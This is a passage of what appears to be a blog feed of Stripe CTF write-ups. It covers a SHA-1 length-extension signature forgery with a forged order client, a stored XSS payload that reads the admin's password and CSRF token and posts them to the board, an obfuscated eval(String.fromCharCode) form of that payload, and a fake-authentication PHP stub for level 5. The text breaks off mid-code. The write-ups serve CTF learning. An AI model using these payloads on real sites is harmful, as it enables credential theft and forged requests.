&lt;a class="reference external" href="https://twitter.com/_Lopi_"&gt;lopi&lt;/a&gt; and mark, found a script that
could forge the signature for us. The script was taken down since then,
but you can find another working one &lt;a class="reference external" href="https://gist.github.com/philfreo/3873715"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python sha-padding.py
usage: sha-padding.py &amp;lt;keylen&amp;gt; &amp;lt;original_message&amp;gt; &amp;lt;original_signature&amp;gt;
&amp;lt;text_to_append&amp;gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;python sha-padding.py 14
&lt;span class="s2"&gt;&amp;quot;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&amp;quot;&lt;/span&gt;
78943cff885d4b41ff058aa64a36520e66ffdbbe &lt;span class="s2"&gt;&amp;quot;&amp;amp;waffle=liege&amp;quot;&lt;/span&gt;
new msg:
&lt;span class="s1"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
base64:
&lt;span class="nv"&gt;Y291bnQ9MTAmbGF0PTM3LjM1MSZ1c2VyX2lkPTEmbG9uZz0tMTE5LjgyNyZ3YWZmbGU9ZWdnb4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIoJndhZmZsZT1saWVnZQ&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;
new sig: f7d4b492cc3282cd87e61624ee207ca496e807e4
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we just have to make the order:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File forged_client.py&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;StringIO&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;order&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://localhost:9233&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
        &lt;span class="s"&gt;&amp;#39;count=10&amp;amp;lat=37.351&amp;amp;user_id=1&amp;amp;long=-119.827&amp;amp;waffle=eggo&lt;/span&gt;&lt;span class="se"&gt;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02&lt;/span&gt;&lt;span class="s"&gt;(&amp;amp;waffle=liege&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;f7d4b492cc3282cd87e61624ee207ca496e807e4&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;|sig:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;

    &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StringIO&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Curl&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;endpoint&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/orders&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POSTFIELDS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pycurl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WRITEFUNCTION&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;perform&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;curl_object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getvalue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;order&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python forged_client.py
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;confirm_code&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;dummy-password&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Great news: 10 liege&lt;/span&gt;
&lt;span class="s2"&gt;waffles will soon be flying your way!&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;success&amp;quot;&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #6</title><link href="https://allyourbase.utouch.fr/posts/2012/10/28/stripe-ctf-level-6/" rel="alternate"></link><updated>2012-10-28T12:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-28:posts/2012/10/28/stripe-ctf-level-6/</id><summary type="html">&lt;img alt="level06-logo.jpg" class="align-center" src="/images/stripe-ctf-level-6/level06-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-6/stripe-ctf-level06.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;0fed78164db1eced67ff8eeba0998c81901880b293667f63f74e2838e63d2bf3&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a message board: you can share updates with your
friends. The only thing is, you can't put messages with quotes and
double quotes, in order to prevent SQL injection. You also can't change
your password, but don't worry, it's visible on your profile page. Can
we use this to retrieve the admin's password?&lt;/p&gt;
&lt;p&gt;This level is a lot like level #4. When you post a message, the
server only checks for quotes and double quotes, not for script tags.
So, we can post a message consisting of javascript code which will
retrieve the password and post it on the board. But we can't use quotes
or double quotes: we'll have to obfuscate our code. And since the
admin's password contains quotes and double quotes, we'll have to
obfuscate it as well before we post it to the board. I chose to use
base64, and I found a javascript implementation
&lt;a class="reference external" href="http://www.webtoolkit.info/javascript-base64.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;xml_password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/user_info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;password_page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;xml_password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;responseText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;csrf_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;new_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;elements&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;_csrf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;title=password&amp;amp;body=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;password_page&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;amp;_csrf=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
    &lt;span class="nx"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/posts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setRequestHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Connection&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;keep-alive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;xml_post&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;pwn_password&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We'll obfuscate it using String.fromCharCode (the following result
contains also the base64 function):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;fromCharCode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[...]&lt;/span&gt; &lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;125&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- The result is too big to be displayed entirely --&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's post this and wait for the admin to log in.&lt;/p&gt;
&lt;img alt="level06-form.png" class="align-center" src="/images/stripe-ctf-level-6/level06-form.png" /&gt;
&lt;p&gt;Now, we check the source code, and we see some base64-encoded stuff.&lt;/p&gt;
&lt;img alt="level06-source.png" class="align-center" src="/images/stripe-ctf-level-6/level06-source.png" /&gt;
&lt;p&gt;We just have to decode it.&lt;/p&gt;
&lt;img alt="level06-base64-decoded.png" class="align-center" src="/images/stripe-ctf-level-6/level06-base64-decoded.png" /&gt;
&lt;p&gt;We URL decode it, to clean a little bit:&lt;/p&gt;
&lt;img alt="level06-w00t.png" class="align-center" src="/images/stripe-ctf-level-6/level06-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #5</title><link href="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-5/" rel="alternate"></link><updated>2012-10-27T23:31:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:posts/2012/10/27/stripe-ctf-level-5/</id><summary type="html">&lt;img alt="level05-logo.jpg" class="align-center" src="/images/stripe-ctf-level-5/level05-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-5/stripe-ctf-level05.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;82b066cca46fd24a16959ada973d6df0d7c693f7791a8b673add276f324a5885&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants to solve a real problem: identification. We have too
many online accounts and we have to remember usernames/passwords for
everyone of them. It would be way simpler to be able to log into a new
web service using your Google account, or your Facebook account (kind of
like &lt;a class="reference external" href="https://en.wikipedia.org/wiki/OpenID"&gt;OpenID&lt;/a&gt;). That's what
this level is all about.&lt;/p&gt;
&lt;p&gt;This service asks for a pingback address (it's the service you want
to use to identify, like using Google or Facebook with OpenID), and your
username/password to this pingback. The form will then send your
credentials to the pingback and see if you're successfully
authenticated.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 20&lt;/span&gt;
&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^level05-\d+\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# The pingback must follow this regex&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that these regex were for the real CTF. For a local usage, here are
what they look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 23&lt;/span&gt;
&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^localhost$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;//&lt;/span&gt; &lt;span class="c1"&gt;# No restriction on the allowed hosts&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can only use pingback URL ending in .stripe-ctf.com, but fortunately,
we still have access to the social network on level #2! We can upload a
PHP file, which will always say the authentication is successful.&lt;/p&gt;
&lt;p&gt;Note: on the next screenshots, I'll use 127.0.0.1 as the address for
level #2, and localhost as the address for level #5!&lt;/p&gt;
&lt;p&gt;So, how does the service know that we were successfully authenticated to
the pingback?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 109&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;authenticated?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="sr"&gt;/[^\w]AUTHENTICATED[^\w]*$/&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, all we have to do is upload the following file to level #2:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; AUTHENTICATED &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's fill the form to use &lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;
as a pingback:&lt;/p&gt;
&lt;img alt="level05-first-form.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-form.png" /&gt;
&lt;p&gt;We submit, and here are the result of the authentication...&lt;/p&gt;
&lt;img alt="level05-first-login.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-login.png" /&gt;
&lt;p&gt;...and the new login page:&lt;/p&gt;
&lt;img alt="level05-first-authentication.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-authentication.png" /&gt;
&lt;p&gt;Okay, now we can authenticate using this script, but we can't recover
the password, cause the URL is
&lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;, and not
&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. The key is to see how the
server recovers the pingback URL we give him:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 67&lt;/span&gt;
&lt;span class="n"&gt;pingback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:pingback&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="c1"&gt;# File srv.rb, line 80&lt;/span&gt;
&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pingback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="c1"&gt;# File srv.rb, line 99&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Sending request to &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;RestClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
